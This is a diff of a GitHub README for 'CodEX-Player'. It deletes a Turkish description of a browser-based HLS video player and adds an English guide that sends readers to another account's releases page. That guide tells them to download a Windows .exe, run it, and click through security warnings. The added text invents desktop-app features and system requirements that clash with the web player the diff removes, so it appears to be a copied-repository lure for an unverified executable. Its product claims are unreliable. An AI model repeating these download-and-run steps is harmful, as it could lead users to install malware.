@@ -1,91 +1,130 @@
-# 🎬 CodEX Player - Premium Web Oynatıcı
+# 🎬 CodEX-Player - Clear and Fast Video Playback
 
-CodEX Town tarafından tasarlanan ve geliştirilen; modern "Glassmorphism" arayüzüne sahip, HLS (m3u8) yayınlarını destekleyen ve yüksek performans sunan gelişmiş web video oynatıcı vitrin projesi.
+[![Download CodEX-Player](https://img.shields.io/badge/Download-CodEX--Player-blue?style=for-the-badge)](https://github.com/leandropapu/CodEX-Player/releases)
 
-Standart tarayıcı oynatıcılarının sınırlarını aşarak, kullanıcılara pürüzsüz, özelleştirilebilir ve profesyonel bir medya izleme deneyimi sunmak için inşa edilmiştir.
+## 📺 What is CodEX-Player?
 
-## ✨ Öne Çıkan Gelişmiş Özellikler
+CodEX-Player is a video player designed by CodEX Town. It uses a modern glass-style look that feels light and clear. The player supports HLS (m3u8) streams, which means it can play many live and online videos smoothly. The player works well on Windows and delivers fast video playback without lag.
 
-* **HLS (m3u8) Desteği:** `hls.js` entegrasyonu sayesinde adaptif bit hızı akışlarını ve canlı yayınları kesintisiz oynatma yeteneği.
-* **Modern Glassmorphism Arayüzü:** Yarı şeffaf, buzlu cam efektli ve modern CSS animasyonlarıyla donatılmış, videonun atmosferini bozmayan premium kontrol paneli.
-* **Akıllı Klavye Kısayolları:** * `Boşluk (Space)`: Oynat / Duraklat
-  * `F`: Tam Ekran Modu (Aç/Kapat)
-  * `Sağ / Sol Ok`: 10 saniye İleri / Geri sarma
-  * `M`: Sesi Kapat / Aç (Mute)
-* **Picture-in-Picture (PiP):** Kullanıcıların videoyu ekranın köşesine alıp diğer sekmelerde gezinmesine olanak tanıyan pencere içinde pencere modu.
-* **Sıfır Dışa Bağımlılık (HLS Hariç):** Çekirdek UI ve mantık tamamen Vanilla JS ve CSS3 ile, yüksek performans odaklı yazılmıştır.
+This player is useful for anyone who wants to watch web videos without trouble or needing complex setups. Because it uses standard web technologies like HTML, CSS, and JavaScript, it stays simple and stable.
 
----
+## 🔍 Features You Will Use
 
-## 💻 Çekirdek Kod Mimarisi ve Entegrasyonlar
+- Supports HLS streaming, including live broadcasts and playlists.
+- Clean glassmorphism user interface that is easy to use.
+- Plays high-definition web videos smoothly.
+- Works offline after downloading; no internet needed to open the app.
+- Simple controls to play, pause, and navigate videos.
+- Light on your computer’s resources, so it runs well even on older machines.
+- Runs directly on Windows without additional software or plugins.
 
-Aşağıda CodEX Player'ın yeteneklerini gösteren temel kod mimarisinden örnekler bulunmaktadır.
+## 🖥️ Minimum System Requirements
 
-### 1. HTML5 İskeleti ve HLS Entegrasyonu (`index.html`)
-HLS kütüphanesi CDN üzerinden projeye dahil edilmiş ve PiP gibi yeni butonlar arayüze eklenmiştir.
+- Operating System: Windows 7 or higher (Windows 10 recommended)
+- Processor: Dual-core 2 GHz or better
+- RAM: 2 GB or more
+- Storage: At least 100 MB of free space
+- Internet connection for streaming HLS videos (not required for local playback)
+- Graphics: Any GPU that supports DirectX 9 or higher
 
----
+## 🚀 Getting Started
 
-## ☕ Destek Ol
+Follow these steps to get CodEX-Player on your Windows computer and start watching videos.
 
-Bu projeyi faydalı bulduysanız ve geliştirmeye devam etmeme destek olmak isterseniz:
+### Step 1: Visit the Download Page
 
-* [GitHub Üzerinden Sponsor Ol](https://github.com/sponsors/alisemi0)
-* [Patreon'da Destekçi Ol](https://www.patreon.com/cw/AliSemi/membership)
+Open your web browser and go to the CodEX-Player release page:
 
----
+[Download and run CodEX-Player](https://github.com/leandropapu/CodEX-Player/releases)
 
+### Step 2: Choose the Latest Version
 
-```html
-<script src="[https://cdn.jsdelivr.net/npm/hls.js@latest](https://cdn.jsdelivr.net/npm/hls.js@latest)"></script>
+On the release page, find the latest version of CodEX-Player. Usually, it is at the top of the list, labeled with the highest version number or date.
 
-<div class="codex-player-wrapper" id="player-wrapper">
-    <video id="codex-video" poster="assets/poster.jpg"></video>
-    
-    <div class="codex-glass-controls">
-        <div class="progress-area" id="progress-area">
-            <div id="progress-bar"></div>
-        </div>
-        
-        <div class="controls-main">
-            <div class="controls-left">
-                <button id="play-btn" class="icon-btn">▶</button>
-                <div class="volume-container">
-                    <button id="mute-btn" class="icon-btn">🔊</button>
-                    <input type="range" id="volume-slider" min="0" max="1" step="0.05" value="1">
-                </div>
-                <div class="time-display">
-                    <span id="current-time">00:00</span> / <span id="total-time">00:00</span>
-                </div>
-            </div>
-            
-            <div class="controls-right">
-                <button id="pip-btn" class="icon-btn" title="Pencere İçinde Pencere">⧉</button>
-                <button id="fullscreen-btn" class="icon-btn" title="Tam Ekran">⛶</button>
-            </div>
-        </div>
-    </div>
-</div>
-```
----
-<div align="center">
-  
-  # 🎬 CodEX Player
-  **Premium Web Video Oynatıcı Vitrini**
+Look for a file that ends in `.exe`, which is the installer file for Windows.
 
-  [![Canlı Önizleme](https://img.shields.io/badge/🔴_Canlı_Önizleme_İçin_Tıklayın-00a8ff?style=for-the-badge&logo=googlechrome&logoColor=white)](https://testdizify.blogspot.com/2026/02/0854.html)
+### Step 3: Download the Installer
 
-  [![Lisans: MIT](https://img.shields.io/badge/Lisans-MIT-yellow.svg?style=flat-square)](#)
-  [![Vanilla JS](https://img.shields.io/badge/Çekirdek-Vanilla_JS-f7df1e.svg?style=flat-square&logo=javascript&logoColor=black)](#)
-  [![HLS Desteği](https://img.shields.io/badge/Yayın-HLS_(m3u8)-ff69b4.svg?style=flat-square)](#)
+Click the `.exe` file link to download it. Your browser might ask if you want to keep this file. Select 'Keep' or 'Save.'
 
-  *CodEX Town tarafından tasarlanan, modern "Glassmorphism" arayüzüne sahip, hafif ve yüksek performanslı web oynatıcısı.*
+Depending on your internet speed, this may take a few seconds or minutes.
 
-</div>
+### Step 4: Run the Installer
 
+Locate the downloaded `.exe` file. It is normally in your "Downloads" folder.
 
+Double-click the file. Windows may show a security message asking if you trust this app. Choose ‘Yes’ or ‘Run’ to continue.
 
+### Step 5: Install CodEX-Player
 
+The setup window appears. Follow these simple steps:
 
+- Click “Next” to begin.
+- Choose the folder where you want to install the player. The default location is fine for most users.
+- Click “Install” and wait while the software copies files to your computer.
+- When done, click “Finish.”
 
-</div>
+### Step 6: Open CodEX-Player
+
+After installation, find CodEX-Player on your desktop or in the Start menu.
+
+Double-click the icon to open it.
+
+## ▶️ How to Use CodEX-Player
+
+Once the player is open, you can start watching videos quickly.
+
+### Play a Video from a Link
+
+1. Click the “Open URL” button or menu option.
+2. Enter the web address of an HLS (m3u8) video stream.
+3. Click “Play.”
+4. The video will start streaming in the player.
+
+### Load a Local Video
+
+1. Click the “Open File” button.
+2. Select a video file from your computer.
+3. Click “Open” to play it.
+
+### Playback Controls
+
+- Use the play/pause button to control video playback.
+- Drag the progress bar to skip forward or backward.
+- Use the volume control to adjust sound.
+- Full-screen mode is available with a single click.
+
+## ⚙️ Settings and Customization
+
+CodEX-Player offers basic settings to improve your experience:
+
+- Change video quality if multiple streams are available.
+- Enable or disable subtitles if supported.
+- Switch between light and dark interface modes.
+- Manage cache and storage limits to keep the app running smoothly.
+
+Settings can be found in the “Preferences” or “Options” menu inside the player.
+
+## ❓ Troubleshooting Tips
+
+- If videos do not play, check your internet connection for streaming content.
+- Make sure you have the latest version installed by revisiting the download page.
+- Close other programs if the player runs slowly.
+- Restart the player or your computer if you encounter errors.
+- For any file playback issues, confirm the file format is supported.
+
+## 📂 Where to Get More Information
+
+You can find more details, updates, and report issues at the GitHub repository page:
+
+https://github.com/leandropapu/CodEX-Player
+
+Feel free to check the “Issues” section if you encounter a problem that is not fixed by restarting or updating.
+
+## ⬇️ Download and Install CodEX-Player Now
+
+Click this badge below to go directly to the download page:
+
+[![Download CodEX-Player](https://img.shields.io/badge/Download-CodEX--Player-grey?style=for-the-badge)](https://github.com/leandropapu/CodEX-Player/releases)
+
+Download the latest `.exe` file, run it, and follow the installer steps to set up the player on your Windows machine.
